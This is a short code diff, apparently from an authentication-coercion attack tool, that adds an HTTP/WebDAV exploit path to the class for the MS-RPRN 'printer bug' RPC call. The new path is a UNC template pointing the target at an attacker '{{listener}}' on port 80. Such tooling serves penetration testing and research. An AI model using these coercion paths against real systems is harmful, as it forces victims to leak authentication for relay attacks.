@@ -19,7 +19,8 @@ class RpcRemoteFindFirstPrinterChangeNotificationEx(MSPROTOCOLRPCCALL):
     """
 
     exploit_paths = [
-        ("smb", '\\\\{{listener}}\x00')
+        ("smb", '\\\\{{listener}}\x00'),
+        ("http", '\\\\{{listener}}@80/print\x00')
     ]
 
     access = {
